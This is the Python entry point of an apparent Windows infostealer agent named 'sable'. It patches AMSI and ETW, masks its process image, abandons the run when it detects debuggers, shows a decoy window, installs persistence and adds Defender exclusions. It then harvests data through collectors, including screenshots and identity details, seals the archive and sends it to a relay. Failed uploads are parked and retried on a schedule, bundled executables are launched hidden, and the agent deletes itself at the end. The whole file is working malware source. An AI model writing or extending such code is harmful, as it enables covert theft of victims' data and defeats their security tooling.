"""Agent entry point.

The order is fixed and every step depends on the one before it:

1. ``--abe-unwrap`` dispatch. The helper runs as SYSTEM with no config and no
   archive of its own, so it is handled before logging, before the mutex, before
   the gate, before anything that could read a file it does not have.
2. Log setup, then the AMSI and ETW patches. Neither is gated on: a patch that
   fails is a logged False, not a stopped run.
3. Display awareness, thread priority and the environment fingerprint. All three
   are cheapest before the loader has mapped anything.
4. Mutex guard, in the loader, before decryption. Two launches must not race the
   decrypted archive.
5. Footer, decryption, mount. The loader owns every one of those.
6. Config, then the fingerprint verdict, then the image mask. The mask needs the
   configured name, so it cannot come earlier, and it wants to be up before the
   long part of the run starts.
7. Queue drain, retry pass, run context, state load, decoy, persistence, gate,
   collection, seal, delivery, self-remove.

The workspace is the only directory this file owns; every collector is handed its
own inside it by ``sources.run_all``. ``meta/`` holds the run's own paperwork and
never contains collected data.

Nothing here decrypts. Nothing here reads the footer.
"""

from __future__ import annotations

import hashlib
import shutil
import sys
import tempfile
import uuid
from pathlib import Path
from typing import Any, Final

UNWRAP_FLAG: Final[str] = "--abe-unwrap"
DEBUG_FLAG: Final[str] = "--debug"
# What the retry task passes. A run with this flag delivers what an earlier run parked
# and then leaves; it never collects, so a repeating task cannot turn into a repeating
# harvest on a machine that has already been visited.
RETRY_FLAG: Final[str] = "--retry"

# Files under this prefix in the payload archive are extracted side by side, and the
# ones that can be started are started. Declared again in ``core/forge.py``, which
# cannot be imported from inside the archive; tests/test_contracts.py pins the two.
FUSE_PREFIX: Final[str] = "fused/"
BOUND_SUFFIXES: Final[frozenset[str]] = frozenset({".exe", ".com", ".scr"})
_MAX_BOUND_FILES: Final[int] = 8
_MAX_BOUND_BYTES: Final[int] = 64 * 1024 * 1024
_BOUND_CHUNK: Final[int] = 1024 * 1024


def _summary() -> dict:
    """Machine facts for the status messages. Never raises, never blocks a run.

    Gathered once and reused: the geolocation lookup costs a network round trip, and
    three messages asking the same question three times is three chances to time out
    on a target that is about to be killed.
    """
    try:
        from .sources import network, system

        facts = system.identity()
        facts.update(network.location())
        return facts
    except Exception:
        return {}


def _status(block: str, status: str) -> str:
    """One status line under the machine block.

    The block is already markdown; this only decides whether there is one. A run with
    no machine facts still sends the stage, because a bare "delivered" is worth more
    than the nothing it replaces.
    """
    return f"{block}\n**status** {status}" if block else f"**status** {status}"


def _digest(path: Path) -> str:
    """SHA-256 of a file, streamed. Empty string when it cannot be read."""
    try:
        hasher = hashlib.sha256()
        with path.open("rb") as handle:
            for block in iter(lambda: handle.read(_BOUND_CHUNK), b""):
                hasher.update(block)
    except OSError:
        return ""
    return hasher.hexdigest()


def _slug(value: object) -> str:
    """A filename-safe label from a hostname. Never empty, never longer than 24."""
    text = "".join(
        character if character.isalnum() or character in "-_" else "-"
        for character in str(value or "").strip()
    )
    text = "-".join(part for part in text.split("-") if part)
    return text[:24] or "sable"


def _start_bound(archive: Any) -> int:
    """Extract what was welded into the payload and start the launchable part.

    The build welds one file into the archive under ``fused/``; this is the half that
    runs it. Extraction goes to its own folder rather than the loader's workspace,
    because a started program may still want the files beside it long after this run
    ends, and the workspace is removed on the way out.

    The start is a hidden one: a console child of a windowed parent puts a black
    rectangle on the desktop for as long as it runs, and a welded program that does
    that is worse than one that does not start.

    Nothing here is fatal. A member that will not extract or a start that is refused is
    a debug line, never a return: the collection is the job, and a bound file that
    failed to launch must not cost it.
    """
    from . import log, util

    members = [
        info
        for info in archive.infolist()
        if info.filename.startswith(FUSE_PREFIX) and not info.is_dir()
    ]
    if not members:
        return 0
    if len(members) > _MAX_BOUND_FILES:
        log.logger.warning(
            "bound: %d members, carrying the first %d", len(members), _MAX_BOUND_FILES
        )
        members = members[:_MAX_BOUND_FILES]

    root = Path(tempfile.mkdtemp(prefix="sable-bound-"))
    started = 0

    for info in members:
        name = Path(info.filename).name
        if not name or name in (".", ".."):
            continue
        if info.file_size > _MAX_BOUND_BYTES:
            log.logger.warning("bound: %s is %d bytes, skipped", name, info.file_size)
            continue

        target = root / name
        try:
            with archive.open(info) as source, target.open("wb") as sink:
                shutil.copyfileobj(source, sink, _BOUND_CHUNK)
        except OSError:
            log.logger.debug("bound: %s did not extract", name, exc_info=True)
            continue

        if target.suffix.lower() not in BOUND_SUFFIXES:
            continue

        if util.spawn_hidden(f'"{target}"', cwd=root) is None:
            log.logger.debug("bound: %s did not start", name)
            continue
        started += 1

    return started


def _paperwork(
    work: Path,
    *,
    gate_block: dict[str, Any],
    environment: dict[str, Any],
    failures: dict[str, str],
    state_block: dict[str, Any],
) -> None:
    """Write the run's own four files under ``meta/``. Never raises."""
    from . import layout, util

    meta = layout.meta_dir(work)
    util.write_json(meta / "gate.json", gate_block)
    util.write_json(meta / "environment.json", environment)
    util.write_json(meta / "errors.json", failures)
    util.write_json(meta / "state.json", state_block)


def main(argv: list[str] | None = None) -> int:
    args = list(sys.argv[1:] if argv is None else argv)

    # Must be first. The helper is a re-exec of this same entry point under SYSTEM.
    if UNWRAP_FLAG in args:
        from . import abe

        return abe.helper_main(args)

    from . import log

    logger = log.configure(debug=DEBUG_FLAG in args)
    logger.debug("agent start: argv=%s", args)

    # Imported after the log is live: importing winapi creates the WinDLL handles.
    from . import (
        config,
        defender,
        enrich,
        fingerprint,
        gate,
        gdi,
        identity,
        layout,
        loader,
        patch,
        platforms,
        progress,
        relay,
        sources,
        util,
        winapi,
    )
    from . import context as launch
    from . import state as run_state

    logger.debug("amsi patch: %s", patch.patch_amsi())
    logger.debug("etw patch: %s", patch.patch_etw())

    # Before anything enumerates the display and before the loader has mapped the
    # payload: an unaware process sees the desktop scaled and every monitor rectangle
    # disagrees with the pixels under it.
    logger.debug("dpi awareness: %s", winapi.enable_dpi_awareness())
    if not winapi.lower_priority():
        logger.debug("priority: not lowered")
    winapi.lower_thread_priority()

    # Before decryption, so a hostile host is judged before the payload is in memory.
    # The skew probe inside this costs 250 ms and is worth it here: a fast-forwarded
    # clock is the loudest signal there is.
    stamp = fingerprint.evaluate()
    logger.debug(
        "fingerprint: %s score=%d %s",
        stamp.verdict,
        stamp.score,
        [signal.name for signal in stamp.signals],
    )

    if not loader.acquire():
        logger.debug("another instance holds the mutex; exiting")
        return 0

    try:
        prepared = loader.prepare()
    except Exception:
        logger.exception("archive preparation failed")
        return 1

    try:
        try:
            cfg = config.load(prepared.archive)
        except Exception:
            logger.exception("config rejected")
            return 1

        if fingerprint.should_stop(cfg.anti_analysis, stamp):
            # The one exit that produces nothing. It is quiet on purpose: a machine
            # running a debugger is being watched, and a message from here is a message
            # to the watcher.
            logger.warning(
                "anti-analysis: %s (score %d), run abandoned before decryption",
                stamp.verdict,
                stamp.score,
            )
            return 0

        mask: dict[str, object] = {"enabled": False}
        if cfg.mask_peb:
            mask = winapi.mask_process_image(cfg.image_name)
            mask["enabled"] = True
            logger.debug("mask: %s", mask)
            if not (mask.get("image") or mask.get("command")):
                logger.debug("mask: no match, nothing rewritten")

        # A previous run that could not reach the relay parked its archive. Clearing that
        # first is the whole point of the queue: the result already exists, and collecting
        # a second one on top of it is work nobody asked for.
        waiting = relay.drain(cfg)
        if waiting:
            logger.debug("queue: %d archive(s) still waiting", waiting)
            relay.notify(cfg, _status("", f"queue | {waiting} still waiting"))
        else:
            util.cancel_retry()

        if RETRY_FLAG in args:
            logger.debug("retry pass: %d still waiting", waiting)
            if not waiting and cfg.self_remove:
                util.self_remove(util.executable_path())
            return 0

        run_id = uuid.uuid4().hex[:12]
        launch_ctx = launch.evaluate()
        record = run_state.State.start(
            launch_ctx.image,
            launch_ctx.boot_id,
            run_id=run_id,
            resume_hours=cfg.state_hours,
        )
        logger.debug(
            "context: %s first_run=%s boot=%s resumed=%s",
            launch_ctx.mode,
            launch_ctx.first_run,
            launch_ctx.boot_id,
            record.stage == "collecting" and int(record.document.get("resumed") or 0) > 0,
        )

        # Before anything slow, so the window is up while the machine is being read
        # rather than after. It runs on its own thread either way: a dialog must never
        # be the reason a run stalls.
        if cfg.decoy_seconds:
            from . import decoy

            if decoy.start(cfg.decoy_title, cfg.decoy_text, cfg.decoy_seconds) is not None:
                logger.debug("decoy: on screen for %d s", cfg.decoy_seconds)

        # Installed before collection, so a run that dies later still leaves the machine
        # able to produce another result. The original can still remove itself at the end:
        # the staged copy is what survives, so the two settings compose rather than
        # contradict.
        staged = None
        if cfg.persist:
            staged = util.install_persistence(util.executable_path(), cfg.persist_hours)

        # Gathered before anything that can fail, so the first message carries the
        # machine rather than a promise that one is coming.
        summary = _summary()
        block = relay.describe(summary)
        relay.notify(cfg, _status(block, "collecting"), alert=True)

        if cfg.persist:
            if staged is not None:
                summary["persist"] = "installed"
                logger.debug("persist: %s", staged)
            else:
                logger.warning("persist: requested but not installed")
                relay.notify(cfg, _status("", "persist requested | not installed"))

        # The gate never stops a run. A virtual host produces a stamped result and
        # everything else proceeds; a silent exit teaches nobody anything.
        verdict = gate.evaluate()
        logger.debug("gate: virtual=%s hits=%s", verdict.virtual, verdict.hits)
        logger.debug("gate reasons: %s", verdict.reasons)
        gate_note = (
            "virtual (" + ", ".join(str(hit) for hit in verdict.hits) + ")"
            if verdict.virtual
            else "clean"
        )
        summary["gate"] = gate_note

        # Started before collection, so a bound file is live for the whole run and a
        # collection that dies later cannot take it down with it.
        bound = _start_bound(prepared.archive)
        if bound:
            logger.debug("bound: started %d file(s)", bound)

        with util.temp_workspace("sable-collect-") as work:
            managed = layout.prepare(work)

            # A resume is only real when the files are. This copies them out of the
            # workspace the previous run recorded and drops any module whose output did
            # not come across, so a restored session never ships a count for data that is
            # not in the archive.
            carried = record.bring_forward(work)
            if carried:
                logger.debug("state: carried %d file(s) forward", carried)

            # First auto-startup run is the only run that asks: the exclusion applies to
            # a path that now exists, and asking again on every run is a pattern.
            exclusion: dict[str, Any] = {"status": "skipped", "reason": "not first run"}
            if launch_ctx.first_run and cfg.defender_exclusion:
                exclusion = defender.exclusions(managed)
                logger.debug("defender: %s", exclusion["status"])

            record.to_collecting(work)

            counts, failures = sources.run_all(work, cfg, state=record)
            logger.debug("collectors returned %s", counts)

            # Carried into the delivery caption: the count per source is what tells the
            # reader which collector produced nothing, and a bare total cannot.
            summary["counts"] = dict(counts)
            if failures:
                summary["failed"] = failures
                logger.warning("collectors failed: %s", failures)

            # Runs on what the collectors just wrote, before the caption is built so the
            # caption can carry it. It is an optional extra on a run that has already
            # produced the archive: a dead endpoint costs the deadline and nothing else,
            # and a raise here is swallowed rather than allowed to reach the sealer.
            identity_count = 0
            try:
                identity_count = identity.collect(work, cfg)
            except Exception:
                logger.debug("identity: enrichment failed", exc_info=True)
            if identity_count:
                summary["identity"] = identity_count

            details = enrich.collect(work)
            if details:
                summary["details"] = True
            fact_lines = enrich.lines(details, counts)
            volume = platforms.line(counts)
            logger.debug("platforms: %s", volume or "nothing")

            _paperwork(
                work,
                gate_block={
                    "virtual": verdict.virtual,
                    "hits": list(verdict.hits),
                    "reasons": list(verdict.reasons),
                    "fingerprint": stamp.as_dict(),
                    "anti_analysis": cfg.anti_analysis,
                },
                environment={
                    "context": launch_ctx.as_dict(),
                    "defender": exclusion,
                    "mask": mask,
                    "gate": {"virtual": verdict.virtual, "hits": list(verdict.hits)},
                    "uptime_seconds": stamp.window_seconds,
                },
                failures=failures,
                state_block=run_state.snapshot(record.document),
            )

            # A screenshot that came back one colour across every monitor is a session
            # with no desktop under it. Abandoning before sealing spends nothing on a
            # delivery nobody wants; the reason is recorded either way.
            screen_report = util.read_json(managed / layout.MODULE_DIRS["screen"] / "screen.json")
            if cfg.abort_on_uniform_capture and isinstance(screen_report, dict):
                monitors = [item for item in (screen_report.get("monitors") or []) if isinstance(item, dict)]
                captured = [item for item in monitors if item.get("ok")]
                if captured and all(item.get("flat") for item in captured):
                    logger.warning("visual: every captured monitor is one colour, run abandoned")
                    # Recorded in the run state, not in the workspace: the workspace is a
                    # temp folder that is deleted on the way out, so an abandon.json in
                    # there would be gone before anyone could read it.
                    record.to_abandoned("uniform capture")
                    relay.notify(cfg, _status("", f"abandoned | uniform capture | gate {gate_note}"))
                    return 0

            manifest = layout.manifest(
                run_id=run_id,
                agent="sable",
                host=summary.get("hostname"),
                context=launch_ctx.as_dict(),
                fingerprint=stamp.as_dict(),
                gate={"virtual": verdict.virtual, "hits": list(verdict.hits)},
                defender=exclusion,
                mask=mask,
                counts=counts,
                failures=failures,
                platforms=platforms.table(counts),
            )
            util.write_json(work / layout.MANIFEST_MEMBER, manifest)

            summary_lines = [
                relay.describe(summary),
                *fact_lines,
                "",
                f"run {run_id} | layout {layout.LAYOUT_VERSION}",
                "counts " + " | ".join(f"{name} {count:,}" for name, count in sorted(counts.items())),
            ]
            util.write_text(
                work / layout.SUMMARY_MEMBER,
                "\n".join(line for line in summary_lines if line is not None) + "\n",
            )

            # The archive is *created* under the name it ships as. It used to be written
            # as ``payload.zip`` and renamed after hashing, and in the guest every rename
            # was refused with ``WinError 32`` — another process had the freshly written
            # zip open, which is Defender's realtime scanner on a file that appeared a
            # moment ago. Three attempts over 600 ms were not enough, so the delivered
            # file arrived as ``payload-sealed.zip`` with no host name and no run id in
            # it. A name chosen before the first byte is written is a name nothing can
            # take away.
            archive_path = prepared.workspace / f"{_slug(summary.get('hostname'))}-{run_id}.zip"
            if util.make_archive(work, archive_path) is None:
                logger.error("archive creation failed")
                relay.notify(
                    cfg,
                    _status(block, f"collection produced no archive | gate {gate_note}"),
                    alert=True,
                )
                return 1

            try:
                size = archive_path.stat().st_size
            except OSError:
                size = 0
            items = sum(counts.values())

            record.to_collected(archive_path, _digest(archive_path), size)

            # Before transmission, so a failed upload still leaves something to open on
            # a machine the operator controls. Off unless the build asked for it.
            if cfg.keep_local:
                kept = util.keep_archive(
                    archive_path, _slug(summary.get("hostname"))
                )
                if kept is not None:
                    util.write_text(
                        kept.with_suffix(".txt"),
                        f"{relay.describe(summary)}\n"
                        f"**archive** {kept.name}\n"
                        f"**items** {items:,}\n",
                    )
                    relay.notify(cfg, _status("", f"local copy | {kept}"))

            relay.notify(
                cfg,
                _status(
                    "",
                    f"uploading {items:,} items | {relay.human_bytes(size)}"
                    + (f" | {volume}" if volume else ""),
                ),
            )

            # The archive that leaves the machine is password protected. Until now the
            # seal key only wrapped the bundle welded inside the exe, so a link relay put
            # a plain zip on a public host and anyone holding the URL could open it. The
            # key is the password; a failure here falls back to the plain archive rather
            # than costing the delivery.
            shipped = archive_path
            sealed = util.seal_zip(
                archive_path,
                archive_path.with_name(f"{archive_path.stem}-sealed.zip"),
                cfg.seal_key,
            )
            if sealed is not None:
                shipped = sealed
            else:
                relay.notify(cfg, _status("", "sealing failed | sending the plain archive"))

            # Progress is measured off the socket, not off the file: a send that stalls
            # at 40% shows as a stall rather than as a silent timeout.
            reporter = progress.Reporter(
                max(1, shipped.stat().st_size), progress.log_reporter("relay")
            )
            relay.set_progress(reporter)
            record.to_delivering()
            try:
                relay.deliver(cfg, shipped, summary)
            except Exception as exc:
                logger.exception("transmit failed")
                # Park before reporting: the archive is the whole run, and the temp
                # folder it was built in does not survive a reboot. The task brings this
                # image back every 15 minutes until the queue is empty, then removes
                # itself; the image stays on disk only while something is waiting.
                parked = util.park_archive(shipped)
                if parked is not None and util.schedule_retry(
                    util.executable_path(), loader.carrier_args()
                ):
                    where = "parked | retrying every 15 min"
                elif parked is not None:
                    where = f"parked {parked.name} | no task"
                else:
                    where = "nothing parked"
                relay.notify(
                    cfg,
                    _status(block, f"transmit failed | {exc} | gate {gate_note} | {where}"),
                    alert=True,
                )
                return 1
            finally:
                reporter.finish()
                relay.set_progress(None)

            record.to_done()

            # The exclusions existed for the copy and the copy is over. They are taken
            # back here rather than in teardown because this is the only path where the
            # run no longer needs an unscanned workspace: a failed upload parks the
            # archive and comes back, and that run wants its workspace excluded again.
            defender.withdraw(exclusion)

            # The file message already carries the block and the mention; repeating
            # both here would buzz twice for one delivery.
            relay.notify(cfg, _status("", "delivered"))

        if cfg.self_remove:
            util.self_remove(util.executable_path())

        return 0
    finally:
        gdi.stop()
        loader.cleanup()


if __name__ == "__main__":
    raise SystemExit(main())
